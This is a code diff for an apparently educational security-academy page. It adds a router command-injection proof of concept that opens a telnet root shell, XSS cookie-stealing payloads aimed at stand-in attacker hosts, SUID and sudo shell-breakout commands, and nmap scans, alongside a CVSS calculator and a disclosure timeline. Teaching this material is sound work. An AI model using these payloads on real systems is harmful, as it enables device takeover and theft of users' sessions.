+                    <p>Decrypted flash memory dump using <code>binwalk -e DecoM5_V1_2025.bin</code> to isolate squashfs filesystems.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>Binary Decompilation</h4>
+                    <p>Loaded <code>/usr/bin/tdpd</code> daemon in Ghidra. Traced network listening loops on port 20002 UDP.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>Vulnerability Identified</h4>
+                    <p>Found a dynamic command execution vector inside a proprietary diagnostic broadcast routine. Unsanitized parameter is directly passed to <code>popen()</code>.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Deco M5 Diagnostic Exploit script</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_deco_code')">Copy</button>
+                <pre id="poc_deco_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;">import socket
+
+target_ip = "192.168.68.1"
+port = 20002
+
+# Command injection payload inside the diagnostic broadcast envelope
+payload = b"\\x01\\x00\\x00\\x00" + b"diagnostic_ping;telnetd -l /bin/sh -p 4444;"
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(payload, (target_ip, port))
+print("[+] Diagnostic payload sent. Attempting connection to telnet shell...")</pre>
+              </div>
+            `,
+            quiz: `
+              <h3>Knowledge Assessment</h3>
+              <p>Which Linux kernel mechanism protects routers against standard heap/stack execution?</p>
+              <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) AppArmor profiles</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) NX/DEP (No-Execute) & ASLR (Address Space Layout Randomization)</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Chroot jail setups</button>
+              </div>
+              <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
+            `
+          }
+        }
+      },
+      tools: {
+        'cvss-calc': {
+          title: "CVSS v3.1 Interactive Calculator",
+          tabs: {
+            details: `
+              <h3>CVSS Base Score Calculator</h3>
+              <p>Use this interactive tool to determine the severity rating of security vulnerabilities based on the official FIRST CVSS v3.1 framework metrics.</p>
+              
+              <div class="calc-grid" style="display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px;">
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Attack Vector (AV)</strong>
+                    <span>Where can the exploit be executed from?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="AV">
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">Network (0.85)</button>
+                    <button class="calc-btn" data-val="A" data-weight="0.62" onclick="selectCvssMetric(this)">Adjacent (0.62)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.55" onclick="selectCvssMetric(this)">Local (0.55)</button>
+                    <button class="calc-btn" data-val="P" data-weight="0.20" onclick="selectCvssMetric(this)">Physical (0.20)</button>
+                  </div>
+                </div>
+                
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Attack Complexity (AC)</strong>
+                    <span>Are there special conditions required?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="AC">
+                    <button class="calc-btn active" data-val="L" data-weight="0.77" onclick="selectCvssMetric(this)">Low (0.77)</button>
+                    <button class="calc-btn" data-val="H" data-weight="0.44" onclick="selectCvssMetric(this)">High (0.44)</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Privileges Required (PR)</strong>
+                    <span>Does the attacker need authorization?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="PR">
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">None (0.85)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.62" onclick="selectCvssMetric(this)">Low (0.62)</button>
+                    <button class="calc-btn" data-val="H" data-weight="0.27" onclick="selectCvssMetric(this)">High (0.27)</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>User Interaction (UI)</strong>
+                    <span>Does a victim need to perform an action?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="UI">
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">None (0.85)</button>
+                    <button class="calc-btn" data-val="R" data-weight="0.62" onclick="selectCvssMetric(this)">Required (0.62)</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Scope (S)</strong>
+                    <span>Does the impact extend beyond the vulnerable component?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="S">
+                    <button class="calc-btn active" data-val="U" data-weight="0" onclick="selectCvssMetric(this)">Unchanged</button>
+                    <button class="calc-btn" data-val="C" data-weight="1" onclick="selectCvssMetric(this)">Changed</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Confidentiality (C)</strong>
+                    <span>What level of data read access is gained?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="C">
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Integrity (I)</strong>
+                    <span>What level of data modification is gained?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="I">
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                  </div>
+                </div>
+
+                <div class="calc-metric-row">
+                  <div class="calc-metric-label">
+                    <strong>Availability (A)</strong>
+                    <span>Can the service be shut down or crashed?</span>
+                  </div>
+                  <div class="calc-btn-group" data-metric="A">
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Output Box -->
+              <div class="calc-score-display critical" id="cvssResultDisplay" style="margin-top: 25px; padding: 20px; border-radius: 8px; border: 2px solid; text-align: center;">
+                <div style="font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.7);">Calculated Base Score</div>
+                <div id="cvssScoreText" style="font-size: 3rem; font-weight: bold; margin: 5px 0;">9.8</div>
+                <div id="cvssVectorText" style="font-family: 'Fira Code', monospace; font-size: 0.8rem; background: rgba(0,0,0,0.3); padding: 5px 10px; border-radius: 4px; display: inline-block;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+              </div>
+            `
+          }
+        },
+        'timeline': {
+          title: "Vulnerability Timeline Tracker",
+          tabs: {
+            details: `
+              <h3>Vulnerability Disclosure Timeline</h3>
+              <p>Tracking the full response timeline from zero-day discovery to final vendor patch coordination.</p>
+              
+              <div style="position: relative; border-left: 2px solid rgba(0, 229, 255, 0.3); margin: 25px 0 25px 20px; padding-left: 20px;">
+                <div style="margin-bottom: 20px; position: relative;">
+                  <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #ff5555;"></div>
+                  <strong style="color: #ff5555;">Day 0 (May 1, 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vulnerability identified inside source code and target device memory dumps during blackbox assessment.</p>
+                </div>
+                
+                <div style="margin-bottom: 20px; position: relative;">
+                  <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #ffd500;"></div>
+                  <strong style="color: #ffd500;">Day 3 (May 4, 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Full proof-of-concept exploit validated. Security advisory written and dispatched to security@tp-link.com.</p>
+                </div>
+
+                <div style="margin-bottom: 20px; position: relative;">
+                  <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #00e5ff;"></div>
+                  <strong style="color: #00e5ff;">Day 7 (May 8, 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vendor security team acknowledges receipt of report, confirms root-cause investigation is underway.</p>
+                </div>
+
+                <div style="margin-bottom: 0; position: relative;">
+                  <div style="position: absolute; left: -27px; top: 2px; width: 12px; height: 12px; border-radius: 50%; background: #50fa7b;"></div>
+                  <strong style="color: #50fa7b;">Day 45 (June 15, 2026)</strong>
+                  <p style="margin: 5px 0; color: #fff; font-size: 0.9rem;">Vendor releases beta patch verification. CVE assigned. Final firmware release coordinated and published.</p>
+                </div>
+              </div>
+            `
+          }
+        }
+      },
+      walkthrough: {
+        'nmap-notes': {
+          title: "Nmap Scan Deep Dive",
+          tabs: {
+            details: `
+              <h3>Understanding Port Scanning Fundamentals</h3>
+              <p>Nmap (Network Mapper) is the primary reconnaissance tool for any network pentest. It maps active nodes, port bindings, protocols, and vulnerabilities.</p>
+              <h4>Key Scan Types:</h4>
+              <ul>
+                <li><strong>SYN Scan (-sS):</strong> Stealth scan. Does not complete the 3-way handshake (sends SYN, receives SYN-ACK, sends RST).</li>
+                <li><strong>Connect Scan (-sT):</strong> Full TCP connection. Slower and logs connection attempt.</li>
+                <li><strong>UDP Scan (-sU):</strong> Scans UDP ports. Slower due to ICMP Port Unreachable packet rate limits.</li>
+              </ul>
+            `,
+            flow: `
+              <h3>STEALTH SYN SCAN (TCP Half-Open)</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>SYN Packet</h4>
+                    <p>Nmap sends a TCP SYN packet to target port (e.g., 80).</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>SYN-ACK Reply</h4>
+                    <p>If port is OPEN, server replies with SYN-ACK. (If closed, replies with RST).</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>RST Packet</h4>
+                    <p>Nmap immediately sends a RST packet to teardown connection before OS socket layer logs it.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Useful Nmap Command Cheat Sheet</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_nmap_commands')">Copy</button>
+                <pre id="poc_nmap_commands" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;"># Fast stealth scan with OS detection and service version detection
+nmap -sS -O -sV -F 192.168.1.1
+
+# Comprehensive all-ports scan saving output to files
+nmap -p- -A -oA full_scan_output 10.10.10.24
+
+# Script scan for Vulnerabilities
+nmap --script vuln 10.10.10.24</pre>
+              </div>
+            `
+          }
+        },
+        'xss-basics': {
+          title: "Cross-Site Scripting (XSS) Walkthrough",
+          tabs: {
+            details: `
+              <h3>XSS Vulnerabilities Overview</h3>
+              <p>Cross-Site Scripting occurs when an application receives untrusted user input and processes it into a webpage header or body without escaping or sanitization.</p>
+              <h4>Types of XSS:</h4>
+              <ul>
+                <li><strong>Stored XSS:</strong> Exploit payload is saved on target server (e.g., comment section) and executes when other users view the page.</li>
+                <li><strong>Reflected XSS:</strong> Exploit payload is embedded in target URL and reflected back off web server response (e.g., search queries).</li>
+                <li><strong>DOM-based XSS:</strong> Client-side JavaScript parses URL hashes or variables and passes them directly to sink functions like <code>innerHTML</code>.</li>
+              </ul>
+            `,
+            flow: `
+              <h3>Stored XSS Execution</h3>
+              <div class="attack-flow-visual">
+                <div class="flow-step">
+                  <div class="flow-step-number">1</div>
+                  <div class="flow-step-body">
+                    <h4>Payload Submission</h4>
+                    <p>Attacker submits a guestbook entry containing <code>&lt;script&gt;fetch('http://hacker.com/log?c=' + document.cookie)&lt;/script&gt;</code>.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">2</div>
+                  <div class="flow-step-body">
+                    <h4>Database Storage</h4>
+                    <p>The insecure application stores the payload directly in the database without sanitizing HTML tags.</p>
+                  </div>
+                </div>
+                <div class="flow-arrow">↓</div>
+                <div class="flow-step">
+                  <div class="flow-step-number">3</div>
+                  <div class="flow-step-body">
+                    <h4>Execution on Victim</h4>
+                    <p>Victim views guestbook. Server loads entry. Victim's browser executes script, sending session cookies to attacker.</p>
+                  </div>
+                </div>
+              </div>
+            `,
+            poc: `
+              <h3>Exploit Payloads Examples</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_xss_payloads')">Copy</button>
+                <pre id="poc_xss_payloads" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffd500;"><!-- Basic Alert Payload -->
+<script>alert(document.domain)</script>
+
+<!-- Bypass Image Error Payload -->
+<img src=x onerror=alert(1)>
+
+<!-- Cookie Extraction Payload -->
+<script>
+  new Image().src="http://attacker.com/steal?cookie="+encodeURIComponent(document.cookie);
+</script></pre>
+              </div>
+            `
+          }
+        },
+        'linux-privesc': {
+          title: "Linux Privilege Escalation Techniques",
+          tabs: {
+            details: `
+              <h3>Escalating Local User to Root</h3>
+              <p>Once a local shell is obtained, privilege escalation refers to exploitation vectors to elevate rights to the local root administrator.</p>
+              <h4>Key Assessment Vectors:</h4>
+              <ul>
+                <li><strong>SUID Binaries:</strong> Executables run with owner rights. Misconfigured owners allow shell breakout (e.g., custom scripts, bash, find).</li>
+                <li><strong>Sudo privileges:</strong> Command execution rights allowed by <code>/etc/sudoers</code>. Check via <code>sudo -l</code>.</li>
+                <li><strong>Writable configuration files:</strong> Writable <code>/etc/passwd</code> or <code>/etc/shadow</code> or cron jobs.</li>
+              </ul>
+            `,
+            poc: `
+              <h3>SUID and Sudo Escalation Payloads</h3>
+              <div style="position: relative;">
+                <button class="btn-copy-code" onclick="copyResearchCode('poc_privesc_commands')">Copy</button>
+                <pre id="poc_privesc_commands" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;"># 1. Check for SUID binaries in standard directories
+find / -perm -u=s -type f 2>/dev/null
+
+# 2. Breakout via SUID "find" binary
+find . -exec /bin/sh -p \\; -quit
+
+# 3. Check current sudo permissions
+sudo -l
+
+# 4. If sudoers allows running "nano" as root
+sudo nano
+# Inside nano: press Ctrl+R then Ctrl+X and type: reset; sh 1>&0 2>&0</pre>
+              </div>
+            `
+          }
+        },
+        'burp-suite': {
+          title: "Burp Suite Pro Tips for Web Audits",
+          tabs: {
+            details: `
+              <h3>Maximizing Proxy & Auditing Workflows</h3>
+              <p>Burp Suite is the industry-standard HTTP intercepting proxy. It allows auditing parameters, modifying headers in real-time, and launching brute force attacks.</p>
+              <h4>Core Components:</h4>
+              <ul>
+                <li><strong>Proxy:</strong> Intercepts, reviews, and modifies client-server requests.</li>
+                <li><strong>Repeater:</strong> Manually modifies and resends single HTTP requests repeatedly to isolate parameter responses.</li>
+                <li><strong>Intruder:</strong> Automates customized requests for credential stuffing, fuzzing, and directory discovery.</li>
+              </ul>
+            `
+          }
+        },
+        'feroxbuster': {
+          title: "Fast Directory Discovery with Feroxbuster",
+          tabs: {
+            details: `
+              <h3>Recursive Content Discovery</h3>
+              <p>Feroxbuster is a high-speed multi-threaded directory busting tool written in Rust. It discovers hidden directories, configuration backups, and administrative endpoints.</p>
+              <h4>Key Strengths:</h4>
+              <ul>
+                <li><strong>High Speed:</strong> Handles thousands of requests per second.</li>
+                <li><strong>Auto-Recursion:</strong> Dynamically scans newly discovered sub-directories.</li>
+                <li><strong>Smart Filters:</strong> Excludes specific response codes, sizes, or line counts to prevent false positives.</li>
+              </ul>
+            `
+          }
+        }
+      }
+    };
+
+    let activeResearchCategory = 'cve';
+    let activeResearchId = 'CVE-2025-1024';
+    let activeResearchTab = 'details';
+
+    function loadResearch(category, id) {
+      activeResearchCategory = category;
+      activeResearchId = id;
+      activeResearchTab = 'details'; // reset to first tab
+
+      // Highlight sidebar active item
+      document.querySelectorAll('.research-item').forEach(btn => {
+        const onclickAttr = btn.getAttribute('onclick') || '';
+        const isActive = onclickAttr.includes(`'${category}'`) && onclickAttr.includes(`'${id}'`);
+        btn.classList.toggle('active', isActive);
+      });
+
+      renderResearchContent();
+    }
+    window.loadResearch = loadResearch;
+
+    function switchResearchTab(tabName) {
+      activeResearchTab = tabName;
+      renderResearchContent();
+    }
+    window.switchResearchTab = switchResearchTab;
+
+    function renderResearchContent() {
+      const canvas = document.getElementById('researchCanvas');
+      if (!canvas) return;
+
+      const categoryData = researchData[activeResearchCategory];
+      if (!categoryData || !categoryData[activeResearchId]) {
+        canvas.innerHTML = `<div style="color: rgba(255,255,255,0.4); text-align: center; margin-top: 50px;">Select a research item to view details</div>`;
+        return;
+      }
+
+      const data = categoryData[activeResearchId];
+      const tabsAvailable = Object.keys(data.tabs || {});
+
+      let html = '';
+
+      // Render Header
+      html += `
+        <div class="cve-view-header">
+          <div class="cve-view-meta">
+      `;
+      if (activeResearchCategory === 'cve') {
+        html += `<span class="cve-id-badge">${activeResearchId}</span>`;
+        if (data.severity) {
+          const sevClass = data.severity.toLowerCase();
+          html += `<span class="cve-severity-badge ${sevClass}">${data.severity} (CVSS ${data.score})</span>`;
+        }
+      } else {
+        html += `<span class="cve-id-badge" style="text-transform: uppercase;">${activeResearchCategory}</span>`;
+      }
+      html += `
+          </div>
+          <h1 class="cve-view-title">${data.title}</h1>
+        </div>
+      `;
+
+      // Render Tab links
+      if (tabsAvailable.length > 0) {
+        html += `<div class="cve-tabs">`;
+        tabsAvailable.forEach(tab => {
+          const isActive = activeResearchTab === tab;
+          let label = tab.charAt(0).toUpperCase() + tab.slice(1);
+          if (tab === 'poc') label = 'Proof of Concept';
+          if (tab === 'flow') label = 'Attack Flow';
+          if (tab === 'quiz') label = 'Quick Assessment';
+          html += `<button class="cve-tab ${isActive ? 'active' : ''}" onclick="switchResearchTab('${tab}')">${label}</button>`;
+        });
+        html += `</div>`;
+      }
+
+      // Render active tab content
+      const tabContent = data.tabs[activeResearchTab] || '';
+      html += `<div class="cve-tab-content-wrapper">${tabContent}</div>`;
+
+      canvas.innerHTML = html;
+
+      // Re-trigger CVSS calculations if CVSS tab loaded
+      if (activeResearchId === 'cvss-calc') {
+        calculateCvssScore();
+      }
+    }
+    window.renderResearchContent = renderResearchContent;
+
+    function copyResearchCode(elementId) {
+      const codeElement = document.getElementById(elementId);
+      if (!codeElement) return;
+
+      const codeText = codeElement.innerText;
+      navigator.clipboard.writeText(codeText).then(() => {
+        const copyBtn = codeElement.parentElement.querySelector('.btn-copy-code');
+        if (copyBtn) {
+          copyBtn.innerText = 'Copied!';
+          setTimeout(() => {
+            copyBtn.innerText = 'Copy';
+          }, 2000);
+        }
+      }).catch(err => {
+        console.error('Failed to copy: ', err);
+      });
+    }
+    window.copyResearchCode = copyResearchCode;
+
+    function evaluateQuizOption(btn, isCorrect) {
+      const container = btn.parentElement;
+      const feedback = container.nextElementSibling;
+      
+      // Reset all buttons
+      container.querySelectorAll('.quiz-opt-btn').forEach(b => {
+        b.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+        b.style.background = 'rgba(255, 255, 255, 0.03)';
+      });
+
+      if (isCorrect) {
+        btn.style.borderColor = '#50fa7b';
+        btn.style.background = 'rgba(80, 250, 123, 0.1)';
+        feedback.innerHTML = `<span style="color: #50fa7b;">Correct! Well done. +25 Academy XP</span>`;
+        
+        // Award XP once
+        const xpKey = `research_quiz_${activeResearchId}_completed`;
+        if (localStorage.getItem(xpKey) !== 'true') {
+          localStorage.setItem(xpKey, 'true');
+          let xp = parseInt(localStorage.getItem('academy_xp')) || 0;
+          xp += 25;
+          localStorage.setItem('academy_xp', xp);
+          updateXPDisplay();
+          syncProgressWithDatabase();
+        }
+      } else {
+        btn.style.borderColor = '#ff5555';
+        btn.style.background = 'rgba(255, 85, 85, 0.1)';
+        feedback.innerHTML = `<span style="color: #ff5555;">Incorrect. Try again!</span>`;
+      }
+    }
+    window.evaluateQuizOption = evaluateQuizOption;
+
+    // CVSS metric selections
+    function selectCvssMetric(btn) {
+      const parent = btn.parentElement;
+      parent.querySelectorAll('.calc-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      calculateCvssScore();
+    }
+    window.selectCvssMetric = selectCvssMetric;
+
+    function calculateCvssScore() {
+      // Metric Weights based on CVSS v3.1 Specifications
+      const metrics = {
+        AV: { N: 0.85, A: 0.62, L: 0.55, P: 0.20 },
+        AC: { L: 0.77, H: 0.44 },
+        PR: {
+          U: { N: 0.85, L: 0.62, H: 0.27 }, // Scope Unchanged
+          C: { N: 0.85, L: 0.68, H: 0.50 }  // Scope Changed
+        },
+        UI: { N: 0.85, R: 0.62 },
+        S: { U: 0, C: 1 },
+        C: { N: 0, L: 0.22, H: 0.56 },
+        I: { N: 0, L: 0.22, H: 0.56 },
+        A: { N: 0, L: 0.22, H: 0.56 }
+      };
+
+      // Get values from buttons
+      const getVal = (metric) => {
+        const activeBtn = document.querySelector(`.calc-btn-group[data-metric="${metric}"] .calc-btn.active`);
+        return activeBtn ? activeBtn.getAttribute('data-val') : 'N';
+      };
+
+      const av = getVal('AV');
+      const ac = getVal('AC');
+      const s = getVal('S');
+      const pr = getVal('PR');
+      const ui = getVal('UI');
+      const c = getVal('C');
+      const i = getVal('I');
+      const a = getVal('A');
+
+      // Metric weights
+      const w_av = metrics.AV[av];
+      const w_ac = metrics.AC[ac];
+      const w_pr = metrics.PR[s][pr];
+      const w_ui = metrics.UI[ui];
+      const w_c = metrics.C[c];
+      const w_i = metrics.I[i];
+      const w_a = metrics.A[a];
+
+      // Impact Sub-Score (ISS)
+      const iss = 1 - ((1 - w_c) * (1 - w_i) * (1 - w_a));
+      
+      let impact = 0;
+      if (s === 'U') {
+        impact = 6.42 * iss;
+      } else {
+        impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
+      }
+
+      // Exploitability sub-score
+      const exploitability = 8.22 * w_av * w_ac * w_pr * w_ui;
+
+      let score = 0;
+      if (impact <= 0) {
+        score = 0;
+      } else {
+        if (s === 'U') {
+          score = Math.min(impact + exploitability, 10);
+        } else {
+          score = Math.min(1.08 * (impact + exploitability), 10);
+        }
+      }
+      
+      // Round up to nearest one decimal place
+      score = Math.ceil(score * 10) / 10;
+      if (score > 10) score = 10;
+      if (score < 0) score = 0;
+
+      // Update UI elements
+      const scoreText = document.getElementById('cvssScoreText');
+      const resultDisplay = document.getElementById('cvssResultDisplay');
+      const vectorText = document.getElementById('cvssVectorText');
+
+      if (!scoreText || !resultDisplay || !vectorText) return;
+
+      scoreText.innerText = score.toFixed(1);
+      vectorText.innerText = `CVSS:3.1/AV:${av}/AC:${ac}/PR:${pr}/UI:${ui}/S:${s}/C:${c}/I:${i}/A:${a}`;
+
+      // Reset classes
+      resultDisplay.className = 'calc-score-display';
+      
+      if (score === 0) {
+        resultDisplay.classList.add('none');
+      } else if (score < 4.0) {
+        resultDisplay.classList.add('low');
+      } else if (score < 7.0) {
+        resultDisplay.classList.add('medium');
+      } else if (score < 9.0) {
+        resultDisplay.classList.add('high');
+      } else {
+        resultDisplay.classList.add('critical');
+      }
+    }
+    window.calculateCvssScore = calculateCvssScore;
+
     document.addEventListener('DOMContentLoaded', async () => {
+      // Load default research item
+      loadResearch('cve', 'CVE-2025-1024');
+
       if (IS_KALI_SERVER) {
         try {
           const res = await fetch('/api/auth/profile');
